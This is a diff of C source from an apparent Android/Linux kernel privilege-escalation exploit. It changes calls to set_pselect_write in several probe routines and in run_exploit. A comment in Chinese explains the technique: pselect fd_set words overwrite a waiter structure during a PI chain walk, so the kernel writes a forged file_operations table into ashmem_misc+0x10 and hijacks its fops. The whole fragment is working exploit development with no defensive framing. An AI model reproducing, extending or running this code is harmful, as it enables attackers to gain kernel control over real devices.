@@ -145,7 +145,7 @@ static int run_direct_write_diag(void) {
                   (unsigned long long)value,
                   getenv("DIRECT_WRITE_SHAPE") ? getenv("DIRECT_WRITE_SHAPE") : "1",
                   getuid(), geteuid());
-  set_pselect_write((uintptr_t)target, (uintptr_t)value);
+  set_pselect_write((uintptr_t)target, (uintptr_t)value, 1);
   pin_to_core(CORE);
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
   crash_debug_log(0,
@@ -188,7 +188,7 @@ static int run_direct_write_bootid_probe(void) {
                   getuid(), geteuid());
 
   setenv("DIRECT_WRITE_SHAPE", "1", 0);
-  set_pselect_write(target, value);
+  set_pselect_write(target, value, 1);
   pin_to_core(CORE);
   crash_debug_log(0, "BOOTID_WRITE_PROBE_PREPARE_BEGIN\n");
   page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
@@ -377,7 +377,7 @@ static int run_pselect_layout_only_probe(void) {
   fd_set in, out, ex;
   fake_task = task;
   fake_lock = lock;
-  set_pselect_write(target, value);
+  set_pselect_write(target, value, 1);
   prepare_pselect_fdsets(&in, &out, &ex);
   crash_debug_log(1,
                   "PSELECT_LAYOUT_IN: w0=%016llx w1=%016llx w2=%016llx "
@@ -1155,7 +1155,7 @@ int run_exploit(int argc, char **argv) {
    * 值 = fake_fops (内核页上的伪造 file_operations 表)。
    * pselect fd_set words 覆写 waiter 结构字段, PI chain walk 时
    * 内核将 fake_fops 地址写入 ashmem_misc+0x10, 完成 fops 劫持。 */
-  set_pselect_write(data_addr(ASHMEM_MISC) + 0x10, fake_fops);
+  set_pselect_write(data_addr(ASHMEM_MISC) + 0x10, fake_fops, 1);
   crash_debug_log(0, "STEP2B: set_pselect_write target=0x%llx value=0x%llx\n",
                   (unsigned long long)(data_addr(ASHMEM_MISC) + 0x10),
                   (unsigned long long)fake_fops);
